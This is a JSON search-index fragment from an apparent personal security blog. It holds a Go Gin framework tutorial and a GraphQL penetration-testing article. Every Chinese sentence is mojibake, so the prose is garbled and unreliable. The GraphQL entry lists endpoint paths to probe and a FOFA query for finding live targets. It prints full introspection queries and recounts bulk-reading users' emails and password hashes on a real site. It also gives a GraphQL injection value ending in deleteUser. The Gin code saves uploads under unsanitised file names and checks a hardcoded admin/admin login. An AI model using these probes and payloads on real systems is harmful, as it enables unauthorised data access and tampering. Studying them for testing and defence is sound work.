        "link": "/My-Knowlege-Database/blog/go%E5%BC%80%E5%8F%91/gin%E6%A1%86%E6%9E%B6/",
        "content": "ginæ¡†æ¶ å¿«é€Ÿå…¥é—¨ åˆå§‹åŒ–go mod\ngo mod init \u0026lt;é¡¹ç›®å\u0026gt; ä¸‹è½½ginä¾èµ–\ngo get -u github.com/gin-gonic/gin åˆ›å»ºä¸€ä¸ªexample.go:\npackage main import \u0026#34;github.com/gin-gonic/gin\u0026#34; func main() { router := gin.Default() router.GET(\u0026#34;/whoami\u0026#34;, func(c *gin.Context) { c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;Hello Yuy0ung\u0026#34;, }) }) router.Run(\u0026#34;:5003\u0026#34;) //åœ¨5003ç«¯å£ç›‘å¬å¹¶å¯åŠ¨æœåŠ¡ } è¿è¡Œï¼š\ngo run example.go è®¿é—®127.0.0.1:5003\nåŒ… package main å¯¼å…¥ import ( \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/thinkerou/favicon\u0026#34; ) ä¸»å‡½æ•° å¯åŠ¨ å¯åŠ¨åˆ°5003ç«¯å£ï¼Œä¸€èˆ¬åœ¨ä¸»å‡½æ•°æœ€å\nr.Run(\u0026#34;:5003\u0026#34;) åŸºç¡€èµ„æº r := gin.Default() r.Static(\u0026#34;/static\u0026#34;, \u0026#34;./static\u0026#34;) r.Use(favicon.New(\u0026#34;./static/favicon.ico\u0026#34;)) é¦–é¡µ r.GET(\u0026#34;/index\u0026#34;, func(c *gin.Context) { c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;index\u0026#34;, }) }) 404 r.NoRoute(func(c *gin.Context) { c.JSON(404, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;no route\u0026#34;, }) }) getä¼ å‚ // getä¼ å‚ r.GET(\u0026#34;/user\u0026#34;, func(c *gin.Context) { username, ok := c.GetQuery(\u0026#34;user\u0026#34;) if !ok { c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;need a username\u0026#34;, }) return } password := c.DefaultQuery(\u0026#34;pass\u0026#34;, \u0026#34;123456\u0026#34;) c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;get\u0026#34;, \u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password, }) }) è·¯å¾„ä¼ å‚ // è·¯å¾„ä¼ å‚ r.GET(\u0026#34;/ctf/:name\u0026#34;, func(c *gin.Context) { name := c.Param(\u0026#34;name\u0026#34;) c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;CTFå°±è¯¥å­¦\u0026#34; + name, }) }) jsonä¼ å‚ // jsonä¼ å‚ r.POST(\u0026#34;/json\u0026#34;, func(c *gin.Context) { var user struct { Name string `json:\u0026#34;name\u0026#34;` Pass string `json:\u0026#34;pass\u0026#34;` } if err := c.ShouldBindJSON(\u0026amp;user); err != nil { c.JSON(400, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;å‚æ•°é”™è¯¯\u0026#34;, }) } c.JSON(200, gin.H{ \u0026#34;name\u0026#34;: user.Name, \u0026#34;pass\u0026#34;: user.Pass, }) }) é™æ€htmlé¡µé¢ // é™æ€é¡µé¢ r.GET(\u0026#34;/\u0026#34;, func(c *gin.Context) { c.HTML(200, \u0026#34;index.html\u0026#34;, gin.H{ \u0026#34;title\u0026#34;: \u0026#34;Gin\u0026#34;, }) }) é‡å®šå‘åˆ°å¤–ç«™ //é‡å®šå‘åˆ°cnblogs r.GET(\u0026#34;/blog\u0026#34;, func(c *gin.Context) { c.Redirect(302, \u0026#34;www.cnblogs.com/yuy0ung/\u0026#34;) }) è·³è½¬åˆ°é¡µé¢ r.POST(\u0026#34;/tologin\u0026#34;, func(c *gin.Context) { c.Request.URL.Path = \u0026#34;/login\u0026#34; r.HandleContext(c) }) ç™»å½• r.POST(\u0026#34;/login\u0026#34;, func(c *gin.Context) { username := c.PostForm(\u0026#34;username\u0026#34;) password := c.PostForm(\u0026#34;password\u0026#34;) // username := c.Query(\u0026#34;username\u0026#34;) // password := c.Query(\u0026#34;password\u0026#34;) if username == \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; password == \u0026#34;admin\u0026#34; { c.JSON(200, gin.H{ \u0026#34;status\u0026#34;: \u0026#34;ok\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;ç™»å½•æˆåŠŸ\u0026#34;, }) } else { c.JSON(200, gin.H{ \u0026#34;status\u0026#34;: \u0026#34;error\u0026#34;, }) } }) æ–‡ä»¶ä¸Šä¼  é…åˆå‰ç«¯ä½¿ç”¨ï¼š\n//æ–‡ä»¶ä¸Šä¼ é¡µé¢ r.GET(\u0026#34;/upload\u0026#34;, func(c *gin.Context) { c.HTML(200, \u0026#34;upload.html\u0026#34;, gin.H{ \u0026#34;title\u0026#34;: \u0026#34;ä¸Šä¼ æ–‡ä»¶\u0026#34;, }) }) r.POST(\u0026#34;/upload\u0026#34;, func(c *gin.Context) { //ä»è¯·æ±‚ä¸­è¯»å–æ–‡ä»¶ file, err := c.FormFile(\u0026#34;file\u0026#34;) if err != nil { c.JSON(500, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;ä¸Šä¼ æ–‡ä»¶å¤±è´¥\u0026#34;, }) return } //ä¿å­˜æ–‡ä»¶è‡³./files err = c.SaveUploadedFile(file, \u0026#34;./files/\u0026#34;+file.Filename) if err != nil { c.JSON(500, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;ä¿å­˜æ–‡ä»¶å¤±è´¥\u0026#34;, }) return } c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;ä¸Šä¼ æˆåŠŸ\u0026#34;, }) }) è·¯ç”±ç»„ å°±æ˜¯å¹³æ—¶è§åˆ°çš„/api/v1/xxxé‚£ç§,å¯ä»¥åµŒå¥—\n//è·¯ç”±ç»„ v1 := r.Group(\u0026#34;/api\u0026#34;) { v1.GET(/whoami\u0026#34;, func(c *gin.Context) { c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;Yuy0ung\u0026#34;, }) }) //åµŒå¥— user := v1.Group(\u0026#34;/user\u0026#34;) { user.GET(\u0026#34;/1\u0026#34;, func(c *gin.Context) { c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;user1\u0026#34;, }) }) user.GET(\u0026#34;/2\u0026#34;, func(c *gin.Context) { c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;user2\u0026#34;, }) }) } } ä¸­é—´ä»¶ å¯å¤šå±‚ï¼š\n// å®šä¹‰ä¸­é—´ä»¶ func auth(c *gin.Context) { fmt.Println(\u0026#34;auth in\u0026#34;) c.Next() fmt.Println(\u0026#34;auth out\u0026#34;) } func status(c *gin.Context) { fmt.Println(\u0026#34;status in\u0026#34;) c.Next() fmt.Println(\u0026#34;status out\u0026#34;) } func main() { r := gin.Default() r.Static(\u0026#34;/static\u0026#34;, \u0026#34;./static\u0026#34;) r.Use(favicon.New(\u0026#34;./static/favicon.ico\u0026#34;)) r.GET(\u0026#34;/auth\u0026#34;, auth, status, func(c *gin.Context) { fmt.Println(\u0026#34;authpage in\u0026#34;) c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;auth\u0026#34;, }) }) //....... } å…¨å±€æ³¨å†Œï¼š\nè·¯ç”±ç»„æ³¨å†Œï¼š\nä¼ é€’ä¿¡æ¯ï¼š\nè®¿é—®authè·¯ç”±çš„è¾“å‡ºé¡ºåºï¼š\nauth in status in authpage in ok status out auth out æºç¨‹ä¼ å‚ï¼š\nè¿™é‡Œçš„æºç¨‹å‡½æ•°æ—¶å¼‚æ­¥çš„ï¼Œä¸ä¼šé˜»å¡ä¸»è¯·æ±‚æµç¨‹ï¼Œæ‰§è¡Œæ—¶æœºç”± Go runtime è°ƒåº¦å™¨å†³å®šï¼Œæ‰€ä»¥é€šå¸¸ä¼šâ€œå»¶è¿Ÿâ€ï¼Œè¡¨ç°ä¸ºæœ€åæ‰æ‰“å°\n",
        "summary": "ginæ¡†æ¶ å¿«é€Ÿå…¥é—¨ åˆå§‹åŒ–go mod\ngo mod init \u0026lt;é¡¹ç›®å\u0026gt; ä¸‹è½½ginä¾èµ–\ngo get -u github.com/gin-gonic/gin åˆ›å»ºä¸€ä¸ªexample.go:\npackage main import \u0026#34;github.com/gin-gonic/gin\u0026#34; func main() { router := gin.Default() router.GET(\u0026#34;/whoami\u0026#34;, func(c *gin.Context) { c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;Hello Yuy0ung\u0026#34;, }) }) router.Run(\u0026#34;:5003\u0026#34;) //åœ¨5003ç«¯å£ç›‘å¬å¹¶å¯åŠ¨æœåŠ¡ } è¿è¡Œï¼š\ngo run example.go è®¿é—®127.0.0.1:5003\nåŒ… package main å¯¼å…¥ import ( \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/thinkerou/favicon\u0026#34; ) ä¸»å‡½æ•° å¯åŠ¨ å¯åŠ¨åˆ°5003ç«¯å£ï¼Œä¸€èˆ¬åœ¨ä¸»å‡½æ•°æœ€å\nr.Run(\u0026#34;:5003\u0026#34;) åŸºç¡€èµ„æº r := gin.Default() r.Static(\u0026#34;/static\u0026#34;, \u0026#34;./static\u0026#34;) r.Use(favicon.New(\u0026#34;./static/favicon.ico\u0026#34;)) é¦–é¡µ r.GET(\u0026#34;/index\u0026#34;, func(c *gin.Context) { c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;index\u0026#34;, }) }) 404 r.NoRoute(func(c *gin.Context) { c.JSON(404, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;no route\u0026#34;, }) }) getä¼ å‚ // getä¼ å‚ r.GET(\u0026#34;/user\u0026#34;, func(c *gin.Context) { username, ok := c.GetQuery(\u0026#34;user\u0026#34;) if !ok { c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;need a username\u0026#34;, }) return } password := c.DefaultQuery(\u0026#34;pass\u0026#34;, \u0026#34;123456\u0026#34;) c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;get\u0026#34;, \u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password, }) }) è·¯å¾„ä¼ å‚ // è·¯å¾„ä¼ å‚ r.GET(\u0026#34;/ctf/:name\u0026#34;, func(c *gin.Context) { name := c.Param(\u0026#34;name\u0026#34;) c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;CTFå°±è¯¥å­¦\u0026#34; + name, }) }) jsonä¼ å‚ // jsonä¼ å‚ r.POST(\u0026#34;/json\u0026#34;, func(c *gin.Context) { var user struct { Name string `json:\u0026#34;name\u0026#34;` Pass string `json:\u0026#34;pass\u0026#34;` } if err := c.ShouldBindJSON(\u0026amp;user); err != nil { c.JSON(400, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;å‚æ•°é”™è¯¯\u0026#34;, }) } c.JSON(200, gin.H{ \u0026#34;name\u0026#34;: user.Name, \u0026#34;pass\u0026#34;: user.Pass, }) }) é™æ€htmlé¡µé¢ // é™æ€é¡µé¢ r.GET(\u0026#34;/\u0026#34;, func(c *gin.Context) { c.HTML(200, \u0026#34;index.html\u0026#34;, gin.H{ \u0026#34;title\u0026#34;: \u0026#34;Gin\u0026#34;, }) }) é‡å®šå‘åˆ°å¤–ç«™ //é‡å®šå‘åˆ°cnblogs r.GET(\u0026#34;/blog\u0026#34;, func(c *gin.Context) { c.Redirect(302, \u0026#34;www.cnblogs.com/yuy0ung/\u0026#34;) }) è·³è½¬åˆ°é¡µé¢ r.POST(\u0026#34;/tologin\u0026#34;, func(c *gin.Context) { c.Request.URL.Path = \u0026#34;/login\u0026#34; r.HandleContext(c) }) ç™»å½• r.POST(\u0026#34;/login\u0026#34;, func(c *gin.Context) { username := c.PostForm(\u0026#34;username\u0026#34;) password := c.PostForm(\u0026#34;password\u0026#34;) // username := c.Query(\u0026#34;username\u0026#34;) // password := c.Query(\u0026#34;password\u0026#34;) if username == \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; password == \u0026#34;admin\u0026#34; { c.JSON(200, gin.H{ \u0026#34;status\u0026#34;: \u0026#34;ok\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;ç™»å½•æˆåŠŸ\u0026#34;, }) } else { c.JSON(200, gin.H{ \u0026#34;status\u0026#34;: \u0026#34;error\u0026#34;, }) } }) æ–‡ä»¶ä¸Šä¼  é…åˆå‰ç«¯ä½¿ç”¨ï¼š\n"
    }
,
    {
        "title": "GraphQLæ¸—é€æµ‹è¯•å­¦ä¹ ",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/graphql%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/",
        "content": "æµ…è°ˆGraphQLæ¸—é€æµ‹è¯• å‰ç½®çŸ¥è¯† GraphQLæ¦‚å¿µ GraphQLæ˜¯ä¸€ä¸ªç”¨äº APIçš„æŸ¥è¯¢è¯­è¨€ï¼Œä¸‹é¢æˆ‘ç”¨é€šä¿—çš„è¯­è¨€æ¥è°ˆè°ˆå®ƒçš„ç‰¹ç‚¹ï¼š\nç®€å•è¯´ï¼ŒGraphQL æ˜¯ä¸€ç§â€œçµæ´»å–æ•°æ®â€çš„å·¥å…·ã€‚æ¯”å¦‚ä½ ç‚¹å¤–å–æ—¶ï¼Œå¯ä»¥è‡ªç”±ç»„åˆèœå“ï¼Œè€Œä¸ç”¨æŒ‰å›ºå®šå¥—é¤ç‚¹ã€‚GraphQL çš„ä½œç”¨ç±»ä¼¼ï¼šå‰ç«¯å¯ä»¥æŒ‰éœ€â€œç‚¹â€æ•°æ®ï¼Œåç«¯ç²¾å‡†è¿”å›\né‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥çœ‹å‡ºGraphQLä¸ä¼ ç»ŸRest APIçš„åŒºåˆ«äº†ï¼Œæˆ‘ä»¬åŒæ ·ä»¥â€ç‚¹å¤–å–â€œæ¥æè¿°ï¼š\nRest APIï¼šå›ºå®šå¥—é¤ï¼Œæ¯”å¦‚\nå¥—é¤Aï¼šç”¨æˆ·ä¿¡æ¯ï¼ˆå§“åã€å¤´åƒï¼‰ å¥—é¤Bï¼šç”¨æˆ·çš„æœ‹å‹åˆ—è¡¨ å¥—é¤Cï¼šç”¨æˆ·çš„è®¢å•è®°å½• é‚£ä¹ˆå¯ä»¥çœ‹å‡ºæ¥å®ƒçš„å±€é™ï¼šå¦‚æœä½ æƒ³åŒæ—¶è¦â€œç”¨æˆ·å§“åâ€å’Œâ€œæœ‹å‹åˆ—è¡¨â€ï¼Œå¾—ç‚¹ä¸¤æ¬¡å¥—é¤ï¼ˆå‘ä¸¤æ¬¡è¯·æ±‚ï¼‰ï¼Œæˆ–è€…è®©åç«¯ä¸´æ—¶åšä¸ªæ–°å¥—é¤ï¼ˆæ”¹æ¥å£ï¼‰\nGraphQLï¼šè‡ªåŠ©é¤ï¼Œæƒ³è¦ä»€ä¹ˆç›´æ¥é€šè¿‡æ¥å£å‘Šè¯‰åç«¯ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªè¯·æ±‚ï¼š\nquery { user { name # åªè¦å§“å friends { # å’Œæœ‹å‹åˆ—è¡¨ name } } } è¿™ä¸ªè¯·æ±‚èƒ½å¤Ÿï¼Œä¸€æ¬¡ç²¾å‡†æ‹¿åˆ° name å’Œ friends æ•°æ®ï¼Œä¸ä¼šå¤šæ‹¿ï¼ˆæ¯”å¦‚ä¸éœ€è¦å¤´åƒï¼‰ï¼Œä¹Ÿä¸ä¼šå°‘æ‹¿\né€šè¿‡ä¸Šé¢çš„æè¿°ï¼Œæˆ‘ä»¬èƒ½å¤ŸçŸ¥é“GraphQL APIä¸Rest APIæœ€å¤§çš„åŒºåˆ«ï¼šGraphQL é€šè¿‡å°†æ•°æ®æŸ¥è¯¢å’Œæ•°æ®ä¿®æ”¹åˆ†ç¦»å¼€æ¥ï¼Œä½¿å¾—å®¢æˆ·ç«¯èƒ½å¤Ÿæ›´çµæ´»åœ°æ§åˆ¶æ‰€éœ€æ•°æ®çš„ç²’åº¦å’Œç±»å‹ï¼Œå¹¶ä¸”åœ¨å¤šä¸ªèµ„æºä¹‹é—´å»ºç«‹å…³ç³»\nGraphQLæŸ¥è¯¢æ–¹å¼ æŸ¥è¯¢æ–¹å¼ä¸»è¦æœ‰ï¼š\nQuery Mutation Subscription Input Enum Union Interface æœ€å¸¸è§çš„æ˜¯Queryã€Mutationã€Subscriptionä¸‰ç§ï¼Œè¿™é‡Œç®€å•ä¸¾ä¾‹ï¼š\nQueryï¼ˆæŸ¥è¯¢ï¼‰ ç”¨äºè·å–æ•°æ®ï¼Œåªè¯»å–ä¸ä¿®æ”¹ï¼š\nquery æ“ä½œåç§°(å¯é€‰å‚æ•°) { å­—æ®µå(å‚æ•°) { å­å­—æ®µ } } Mutationï¼ˆå˜æ›´ï¼‰ ç”¨äºä¿®æ”¹æ•°æ®ï¼Œå±äºå†™æ“ä½œï¼Œä¼šæ”¹å˜æœåŠ¡å™¨çŠ¶æ€ï¼š\nmutation æ“ä½œåç§°(è¾“å…¥å‚æ•°) { æ“ä½œå(è¾“å…¥) { è¿”å›çš„å­—æ®µ } } Subscriptionï¼ˆè®¢é˜…ï¼‰ å®æ—¶ç›‘å¬æ•°æ®å˜åŒ–ï¼ˆç±»ä¼¼ WebSocketï¼‰ï¼Œå±äºé•¿è¿æ¥ï¼ŒæœåŠ¡å™¨ä¸»åŠ¨æ¨é€æ•°æ®ï¼š\nsubscription æ“ä½œåç§° { ç›‘å¬çš„äº‹ä»¶å { è¿”å›çš„å­—æ®µ } } ä¾‹ ç®€å•ä»‹ç»äº†ï¼Œå†ä¸¾ä¸ªä¾‹å­ï¼Œè¯·æ±‚å¦‚ä¸‹ï¼š\n# æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯åŠå…¶æ–‡ç« æ ‡é¢˜ query GetUserWithPosts($userId: ID!) { user(id: $userId) { name email posts(limit: 5) { title createdAt } } } é‚£ä¹ˆå“åº”æ ¼å¼ä¸ºï¼š\n{ \u0026#34;data\u0026#34;: { \u0026#34;user\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;å°æ˜\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;xiaoming@example.com\u0026#34;, \u0026#34;posts\u0026#34;: [ { \u0026#34;title\u0026#34;: \u0026#34;GraphQL æ•™ç¨‹\u0026#34;, \u0026#34;createdAt\u0026#34;: \u0026#34;2023-01-01\u0026#34; } ] } } } è¿™é‡ŒåŸºç¡€æ¦‚å¿µå°±ä»‹ç»è¿™ä¹ˆå¤šï¼Œæ›´è¯¦ç»†çš„ä»‹ç»å¯ä»¥å‚è€ƒå®˜ç½‘\nGraphQLæ¸—é€æµ‹è¯• APIå‘ç° é€šè¿‡è·¯å¾„ç‰¹å¾ å› ä¸ºGraphQLçš„â€œè‡ªåŠ©é¤â€ç‰¹æ€§ï¼Œå®ƒçš„æ¥å£è·¯å¾„æ¯”è¾ƒå›ºå®šï¼Œå¸¸è§çš„è·¯å¾„å¦‚ä¸‹ï¼š\n/graphql /graphiql /gql /query /graph /v1/graphql /v2/graphql /v3/graphql /v1/graphiql /v2/graphiql /v3/graphiql /api/graphql /api/graphiql /graphql/api /v1/api/graphql /v2/api/graphql /console /playground /graphql/console /graphql-devtools /graphql-explorer /graphql-playground /graphql-playground-html /laravel-graphql-playground /graphql.php # PHP å®ç° /index.php?graphql # PHP å‚æ•°åŒ– /HyperGraphQL # ç‰¹å®šæ¡†æ¶ /portal-graphql /graphql/schema.json # Schema æ–‡ä»¶ /graphql/schema.xml /graphql/schema.yaml ...... ä¾‹å¦‚ï¼š\næŠ¥é”™ä¿¡æ¯åˆ¤æ–­ ä¸€äº›ä¸æ­£ç¡®çš„è¯·æ±‚ï¼ˆPOST-\u0026gt;GETï¼‰æˆ–è€…å‚æ•°ç¼ºå¤±å¯èƒ½å¯¼è‡´æŠ¥é”™ï¼Œå³å¯å€Ÿæ­¤åˆ¤æ–­ï¼š\né€šè¿‡è¯·æ±‚æ¢æµ‹ é€šè¿‡ä¸€äº›æ¯”è¾ƒé€šç”¨çš„payloadè¿›è¡Œè¯·æ±‚å°è¯•ï¼Œæ¯”å¦‚query{__typename}\nè¿™é‡Œä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨fofaéšä¾¿æ‰¾ä¸€ä¸ªä½¿ç”¨äº†GraphQLçš„ç½‘ç«™ï¼Œé¦–å…ˆç”¨fofaè¯­æ³•æœé›†graphqlæŠ¥é”™çš„ç½‘é¡µï¼š\nbody=\u0026#34;Must provide query string\u0026#34; || body=\u0026#34;GraphQL validation failed\u0026#34; æŸ¥è¯¢åéšä¾¿å¼€ä¸€ä¸ªç½‘é¡µï¼š\nç°åœ¨æŠ¥é”™æ˜¯å› ä¸ºæ²¡æœ‰æä¾›queryå‚æ•°ï¼Œæˆ‘ä»¬ä½¿ç”¨POSTæ–¹æ³•ä¼ ä¸€ä¸ªé€šç”¨çš„payloadè¿›è¡Œè¯·æ±‚æ¢æµ‹ï¼ˆæ³¨æ„ï¼‰Content-Typeæœ€å¥½æ”¹æˆapplication/jsonï¼š\n{\u0026#34;query\u0026#34;:\u0026#34;query{__typename}\u0026#34;} å¯ä»¥çœ‹åˆ°å“åº”ä»400å˜æˆ200ï¼ŒæŸ¥è¯¢æˆåŠŸï¼Œå¦‚æ­¤å³å¯åˆ¤æ–­ç½‘ç«™ä½¿ç”¨äº†graphql APIï¼Œè¯·æ±‚æˆåŠŸåburpä¼šè‡ªåŠ¨å†è¯·æ±‚è¿™é‡Œæ–°å¢ä¸€ä¸ªGraphQLæ¨¡å—ï¼Œå¯ä»¥ç›´æ¥åœ¨è¿™é‡Œæ„é€ graphqlè¯·æ±‚ï¼š\nå½“ç„¶ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ä½¿ç”¨__schemaå­—æ®µè¿›è¡Œå†…çœæŸ¥è¯¢ï¼Œè¿™ä¸ªå­—æ®µåœ¨æ‰€æœ‰æŸ¥è¯¢çš„æ ¹ç±»å‹ä¸Šéƒ½å¯ç”¨ï¼š\næŸ¥è¯¢æ¥å£ä¸­çš„å¯ç”¨ç±»å‹ï¼š\nquery { __schema { types { name } } } æ›´è¯¦ç»†çš„æ¶æ„ä¿¡æ¯ï¼š\nquery {__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}} æ”»å‡»é¢çš„å±•å¼€ ä¿¡æ¯æ³„éœ²/è¶Šæƒ ä¸å½“çš„é…ç½®å¯èƒ½å¯¼è‡´ç½‘ç«™çš„graphqlæ¶æ„ä»¥åŠå­˜å‚¨çš„æ•æ„Ÿæ•°æ®æš´éœ²\næœ‰çš„APIä½¿ç”¨å†…çœæŸ¥è¯¢å¯ä»¥åˆ—å‡ºåˆ—å‡ºGraphQLä¸­æ‰€æœ‰Queryã€Mutationã€ObjectTypeã€Fieldã€Argumentsï¼š\nquery IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } } } } è¿”å›åŒ…è¿”å›çš„å°±æ˜¯è¯¥APIç«¯ç‚¹çš„æ‰€æœ‰ä¿¡æ¯ï¼Œä¾‹å¦‚è¿™ä¸ªç«™ï¼š\næ”¾åˆ°GraphQL Voyagerä¸­å¯ä»¥ç”Ÿæˆå¯è§†åŒ–çš„æ–‡æ¡£ï¼š\næ•ˆæœï¼š\nåœ¨åˆ—å‡ºçš„ä¿¡æ¯ä¸­ï¼Œå¯»æ‰¾æ•æ„Ÿä¿¡æ¯æ¯”å¦‚emailã€passwordã€secretKeyã€tokenã€licenseKeyã€sessionï¼Œè¿˜å¯ä»¥å¤šå¤šå…³æ³¨åºŸå¼ƒçš„å­—æ®µï¼ˆdeprecated fieldsï¼‰\né‚£ä¹ˆä¸Šé¢çš„ä¿¡æ¯é‡Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šemailï¼Œæˆ‘ä»¬æ¥è¯•ç€æŸ¥è¯¢ä¸€ä¸‹ï¼š\nè¿™é‡Œ401äº†ï¼Œå¯ä»¥çœ‹åˆ°æ­£å¸¸æƒ…å†µä¸‹ï¼ŒæŸ¥è¯¢æ˜¯éœ€è¦é‰´æƒçš„ï¼Œå¦‚æœæƒé™æ ¡éªŒä¸å½“ï¼Œå°±ä¼šé€ æˆè¶Šæƒæˆ–è€…æœªæˆæƒæŸ¥è¯¢ï¼Œä¸‹é¢æ˜¯ç¬”è€…é‡åˆ°çš„é‰´æƒä¸å½“å¯¼è‡´çš„æ‰¹é‡æŸ¥çœ‹ç”¨æˆ·é‚®ç®±ä»¥åŠå¯†ç å“ˆå¸Œï¼š\nå½“ç„¶é™¤æ­¤ä»¥å¤–è¿˜å¯ä»¥æœç´¢ç±»å‹ä¸­æ˜¯å¦æœ‰editã€deleteã€removeã€addç­‰åŠŸèƒ½ï¼Œæ¥è¾¾åˆ°æ•°æ®ç¼–è¾‘ã€åˆ é™¤ã€æ·»åŠ çš„åŠŸèƒ½ï¼Œè¿™é‡Œå°±ä¸å†ä¸€ä¸€ä¸¾ä¾‹äº†\nGraphQLæ³¨å…¥ ç›¸ä¿¡åœ¨ä»‹ç»GraphQLçš„æ—¶å€™ä¹Ÿèƒ½æ³¨æ„åˆ°ï¼Œå®ƒçš„åŠŸèƒ½å…¶å®æœ‰ç‚¹ç±»ä¼¼äºSQLçš„å¢åˆ æ”¹æŸ¥ï¼Œè¿™ä¸ªï¼Œè€Œè¿™ä¸ªGraphQLæ³¨å…¥å…¶å®ä¹Ÿå’ŒSQLæ³¨å…¥ç±»ä¼¼\næ‰€è°“æ³¨å…¥ï¼Œæ— éå°±æ˜¯æ„é€ é—­åˆå¹¶æ’å…¥å…¶ä»–è¯­å¥æ‰§è¡Œï¼Œè¿™ä¸ªæ¼æ´Pç¥ä¹Ÿåœ¨å…ˆçŸ¥ç™½å¸½å¤§ä¼šåˆ†äº«è¿‡ï¼Œä¸€çœ‹å°±æ‡‚ï¼ˆçº¢è‰²éƒ¨åˆ†ä¸ºç”¨æˆ·å¯æ§çš„æ³¨å…¥æ•°æ®ï¼‰ï¼š\næ¼æ´çš„å‡ºç°åœºæ™¯å¤§è‡´ä¸ºgraphqlè¯­å¥ä¸å¯æ§ï¼Œä½†è¯­å¥ä¸­çš„æŸä¸€éƒ¨åˆ†å‚æ•°ç”¨æˆ·å¯æ§ï¼Œç½‘é¡µé€»è¾‘å¤§è‡´ä¸ºï¼š\nç”¨æˆ·è®¿é—®URL -\u0026gt; å‰ç«¯è·å–å‚æ•° -\u0026gt; æ‹¼æ¥æˆGraphQLè¯­å¥ -\u0026gt; å‘é€ -\u0026gt; åç«¯æ‰§è¡Œ\nåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥å°è¯•GraphQLæ³¨å…¥æ”¹å˜åŸæœ¬çš„GraphQLè¯­ä¹‰è¿›è¡Œæ¼æ´åˆ©ç”¨\nå’ŒSQLç±»ä¼¼ï¼Œé˜²å¾¡è¿™ç±»æ¼æ´ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢å³å¯ï¼ŒåŸç†å¦‚ä¸‹ï¼š\nGraphQLè¯­å¥ä¸­å£°æ˜å˜é‡å¹¶æŒ‡å®šç±»å‹ï¼š\nquery GetUser($id: ID!) { user(id: $id) { name email } } é€šè¿‡ç‹¬ç«‹çš„å‚æ•°ï¼ˆå¦‚JSONï¼‰ä¼ å…¥å˜é‡å€¼ï¼Œè€Œéç›´æ¥æ‹¼æ¥å­—ç¬¦ä¸²:\n{ \u0026#34;id\u0026#34;: \u0026#34;123\u0026#34; } é‚£ä¹ˆè¿™æ ·æœ€åçš„æŸ¥è¯¢å³ä½¿æ˜¯123\u0026quot;) { deleteUser } # è¿™ç±»å¯èƒ½é€ æˆæ³¨å…¥çš„payloadï¼Œä¹Ÿä¸ä¼šè¢«è§£æä¸ºæ“ä½œï¼Œåœ¨jsonä¸­è¡¨ç°ä¸ºï¼š\n{ \u0026#34;id\u0026#34;: \u0026#34;123) { deleteUser }\u0026#34; } SQLæ³¨å…¥ç­‰ä¼ ç»Ÿæ¼æ´ é™¤äº†GraphQLæ³¨å…¥ï¼ŒSQLæ³¨å…¥ä¹Ÿæ˜¯å¯èƒ½å‡ºç°çš„\nç¬”è€…è¿˜å‘ç°æœ‰çš„æ–‡ç« å°†GraphQLæ³¨å…¥å’ŒSQLæ³¨å…¥æ··ä¸ºä¸€è°ˆï¼Œå…¶å®ä¸¤è€…æœ‰å¾ˆå¤§åŒºåˆ«\né¦–å…ˆæˆ‘ä»¬è¦ç†æ¸…GraphQL APIå’ŒSQLä¹‹é—´åœ¨ç½‘é¡µä¸Šå¯èƒ½å­˜åœ¨çš„è”ç³»ï¼Œå¦‚ä¸‹ï¼š\nå®¢æˆ·ç«¯ â†’ GraphQL APIï¼ˆå‚æ•°åŒ–æŸ¥è¯¢ï¼‰ â†’ 